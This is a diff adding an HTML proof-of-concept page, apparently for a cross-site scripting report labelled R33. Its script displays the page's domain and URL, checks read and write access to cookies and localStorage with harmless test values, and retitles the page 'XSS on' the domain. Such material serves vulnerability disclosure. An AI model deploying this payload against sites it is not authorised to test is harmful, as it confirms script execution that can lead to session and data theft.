@@ -1,0 +1,30 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>R33 PoC</title></head>
+<body style="font:15px/1.6 ui-monospace,monospace;padding:24px;background:#111;color:#0f0">
+<h1 style="color:#fff">R33-XSS-PROOF-HNJM123</h1>
+<pre id="out">script did not run</pre>
+<script>
+(function () {
+  function t(fn) { try { return fn(); } catch (e) { return "BLOCKED: " + e.message; } }
+  var lines = [
+    "MARKER          : R33-XSS-PROOF-HNJM123",
+    "document.domain : " + document.domain,
+    "location.origin : " + location.origin,
+    "location.href   : " + location.href,
+    "cookie r/w      : " + t(function () {
+      document.cookie = "r33poc=1;path=/";
+      return document.cookie.indexOf("r33poc") > -1 ? "READ/WRITE OK" : "no";
+    }),
+    "localStorage r/w: " + t(function () {
+      localStorage.setItem("r33poc", "1");
+      var v = localStorage.getItem("r33poc");
+      localStorage.removeItem("r33poc");
+      return v === "1" ? "READ/WRITE OK" : "no";
+    }),
+    "timestamp       : " + new Date().toISOString()
+  ];
+  document.getElementById("out").textContent = lines.join("\n");
+  document.title = "XSS on " + document.domain;
+})();
+</script>
+</body></html>
